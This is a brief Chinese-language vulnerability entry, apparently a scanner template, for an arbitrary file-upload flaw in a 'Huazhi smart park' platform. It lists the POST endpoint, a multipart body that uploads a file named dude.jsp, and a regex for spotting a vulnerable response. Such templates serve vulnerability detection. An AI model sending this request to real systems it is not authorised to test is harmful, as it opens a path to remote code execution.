# 华智慧园区文件上传RCE

华智慧园区 ｜ 命令执行 ｜ —
- **请求**：`POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1`

**Payload**
```
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="dude.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
dude
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
```
- **响应特征**：200 ^(?=.*?code)(?=.*?data).*?$